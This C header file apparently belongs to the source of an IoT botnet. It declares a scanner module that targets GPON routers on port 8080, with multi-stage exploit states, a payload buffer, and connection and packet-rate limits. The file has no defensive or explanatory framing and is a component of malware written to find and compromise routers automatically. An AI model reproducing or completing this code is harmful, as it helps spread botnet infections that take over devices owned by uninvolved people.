#pragma once
#ifdef NP_TELNET
#include <stdint.h>
#include "includes.h"

#define GPON8080_SCANNER_MAX_CONNS 128
#define GPON8080_SCANNER_RAW_PPS   160
#define GPON8080_SCANNER_RDBUF_SIZE 256

struct gpon8080_scanner_connection {
	int fd, last_recv;
	enum {
		GPON8080_SC_CLOSED,
		GPON8080_SC_CONNECTING,
		GPON8080_SC_EXPLOIT_STAGE2,
		GPON8080_SC_EXPLOIT_STAGE3,
	} state;
	ipv4_t dst_addr;
	uint16_t dst_port;
	int rdbuf_pos;
	char rdbuf[GPON8080_SCANNER_RDBUF_SIZE];
	char payload_buf[512];
};

void gpon8080_scanner_init(void);
void gpon8080_scanner_kill(void);
#endif
